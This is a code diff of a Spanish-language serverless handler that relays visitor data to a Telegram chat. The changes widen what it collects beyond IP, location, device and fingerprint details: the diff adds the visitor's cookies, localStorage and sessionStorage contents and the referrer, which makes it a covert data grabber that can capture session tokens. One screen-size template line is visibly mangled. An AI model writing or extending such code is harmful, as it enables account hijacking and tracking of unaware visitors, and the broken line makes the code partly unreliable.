@@ -1,5 +1,4 @@
 exports.handler = async (event) => {
-  // CORS preflight
   if (event.httpMethod === "OPTIONS") {
     return {
       statusCode: 200,
@@ -34,43 +33,55 @@ exports.handler = async (event) => {
       };
     }
 
-    // Mensaje en texto plano (sin Markdown) para evitar errores
+    // Limpiar valores para que no salgan raros
+    const clean = (v) => (v === undefined || v === null || v === "" ? "N/A" : String(v));
+
     const mensaje =
 `474747 - Nueva información
 
 Red
-• IP: ${data.ip || "N/A"}
-• País: ${data.country || "N/A"}
-• Ciudad: ${data.city || "N/A"}
-• Región: ${data.region || "N/A"}
-• ISP: ${data.isp || "N/A"}
-• Conexión: ${data.conexion || "N/A"}
-• RTT: ${data.rtt || "N/A"}
+• IP: ${clean(data.ip)}
+• País: ${clean(data.country)}
+• Ciudad: ${clean(data.city)}
+• Región: ${clean(data.region)}
+• ISP: ${clean(data.isp)}
+• Conexión: ${clean(data.conexion)}
+• RTT: ${clean(data.rtt)}
 
 Dispositivo
-• OS: ${data.os || "N/A"}
-• Navegador: ${data.browser || "N/A"}
-• Tipo: ${data.device || "N/A"}
-• RAM: ${data.ram || "N/A"}
-• Núcleos: ${data.nucleos || "N/A"}
-• Pantalla: \( {data.pantalla || "N/A"} ( \){data.pixelRatio || "?"}x)
-• Orientación: ${data.orientacion || "N/A"}
-• Color: ${data.colorDepth || "N/A"}
+• OS: ${clean(data.os)}
+• Navegador: ${clean(data.browser)}
+• Tipo: ${clean(data.device)}
+• RAM: ${clean(data.ram)}
+• Núcleos: ${clean(data.nucleos)}
+• Pantalla: \( {clean(data.pantalla)} ( \){clean(data.pixelRatio)}x)
+• Pantalla disponible: ${clean(data.pantallaDisponible)}
+• Orientación: ${clean(data.orientacion)}
+• Color: ${clean(data.colorDepth)}
 
 Batería
-• Nivel: ${data.bateria || "N/A"}
-• Estado: ${data.cargando || "N/A"}
+• Nivel: ${clean(data.bateria)}
+• Estado: ${clean(data.cargando)}
 
 Idioma / Zona
-• Idioma: ${data.idioma || "N/A"}
-• Zona: ${data.zonaHoraria || "N/A"}
+• Idioma: ${clean(data.idioma)}
+• Idiomas: ${clean(data.idiomas)}
+• Zona: ${clean(data.zonaHoraria)}
+
+Almacenamiento y Cookies
+• Cookies habilitadas: ${clean(data.cookiesEnabled)}
+• Cookies: ${clean(data.cookies)}
+• localStorage: ${clean(data.localStorage)}
+• sessionStorage: ${clean(data.sessionStorage)}
 
 Otras
-• Táctil: ${data.toque || "N/A"}
-• Cookies: ${data.cookies || "N/A"}
-• Online: ${data.online || "N/A"}
-• Touch points: ${data.maxTouchPoints || 0}
-• Webdriver: ${data.webdriver || "N/A"}
+• Táctil: ${clean(data.toque)}
+• Touch points: ${clean(data.maxTouchPoints)}
+• Online: ${clean(data.online)}
+• PDF Viewer: ${clean(data.pdfViewer)}
+• Webdriver: ${clean(data.webdriver)}
+• Vendor: ${clean(data.vendor)}
+• Referrer: ${clean(data.referrer)}
 
 ${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" })}`;
 
@@ -80,7 +91,6 @@ ${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: mensaje
-        // sin parse_mode → texto plano, más seguro
       })
     });
 
@@ -91,11 +101,7 @@ ${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires
       return {
         statusCode: 500,
         headers: { "Access-Control-Allow-Origin": "*" },
-        body: JSON.stringify({
-          success: false,
-          error: "Error de Telegram",
-          details: result
-        })
+        body: JSON.stringify({ success: false, error: "Error de Telegram", details: result })
       };
     }
 
@@ -105,10 +111,7 @@ ${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires
         "Content-Type": "application/json",
         "Access-Control-Allow-Origin": "*"
       },
-      body: JSON.stringify({
-        success: true,
-        message: "Enviado correctamente"
-      })
+      body: JSON.stringify({ success: true, message: "Enviado correctamente" })
     };
 
   } catch (error) {
@@ -116,10 +119,7 @@ ${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires
     return {
       statusCode: 500,
       headers: { "Access-Control-Allow-Origin": "*" },
-      body: JSON.stringify({
-        success: false,
-        error: error.message
-      })
+      body: JSON.stringify({ success: false, error: error.message })
     };
   }
 };
